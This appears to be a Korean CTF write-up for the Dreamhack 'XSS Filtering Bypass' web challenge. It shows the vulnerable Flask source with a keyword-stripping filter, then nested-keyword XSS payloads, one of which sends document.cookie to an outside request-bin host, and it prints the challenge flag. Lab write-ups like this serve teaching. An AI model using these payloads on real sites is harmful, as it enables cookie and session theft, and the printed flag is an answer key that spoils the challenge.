---
title: Dreamhack - XSS Filtering Bypass
date: 2022-04-12 22:30 +0900
categories: [Dreamhack, Webhacking]
tags: [dreamhack xss filtering bypass, xss, xss filtering bypass]
---

## XSS Filtering Bypass
<hr style="border-top: 1px solid;"><br>

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    param = xss_filter(param)
    return param

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

```xss_filter``` 함수를 보면 필터링 단어에 대해서 단순히 공백으로 변경해주는 걸 알 수 있다.    
따라서 취약한 필터링 검사 방법을 이용하여 우회할 수 있다.

테스트 쿼리
: ```<img%20src=1%20oonnerror=alert(1);>```
: ```<scscriptript>alert(1);</scscriptript>```

페이로드
: ```<img src="" oonnerror=locatioonn.href="https://izvtycf.request.dreamhack.games?cookie="+document.cookie>```
: ```<scscriptript>locatioonn.href="/memo?memo="+document.cookie;</scscriptript>```

<br>

+ Flag : ```DH{81cd7cb24a49ad75b9ba37c2b0cda4ea}```

<br><br>
<hr style="border: 2px solid;">
<br><br>
